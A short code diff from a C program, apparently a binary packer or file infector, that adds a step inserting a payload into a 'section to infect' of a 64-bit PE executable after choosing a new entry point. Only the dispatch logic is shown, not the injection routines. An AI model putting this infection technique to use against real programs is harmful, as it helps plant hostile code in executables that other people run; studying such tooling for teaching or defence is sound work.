@@ -6,7 +6,7 @@ void 	launcher(int arch, t_mem_image *binary_map, t_mem_image *payload, char *ke
 	int section_to_infect = 0;
 	Elf64_Ehdr *ehdr64 = 0;
 	Elf32_Ehdr *ehdr32 = 0;
-	uint32_t offset = 0;
+	uint32_t new_entry = 0;
 
 	if (arch == 64) // ELF64
 	{
@@ -30,8 +30,9 @@ void 	launcher(int arch, t_mem_image *binary_map, t_mem_image *payload, char *ke
 	}
 	else if (arch == 65) // PE 64bit
 	{
-		if ((section_to_infect = find_section_to_infect_PE64(binary_map, pe_file, payload, &offset)) == -1)
+		if ((section_to_infect = find_section_to_infect_PE64(binary_map, pe_file, payload, &new_entry)) == -1)
 			exit_error("Unable to find a usable infection point", 32);
+		insert_payload_PE64(binary_map, pe_file, section_to_infect, payload, new_entry);
 	}
 }
 
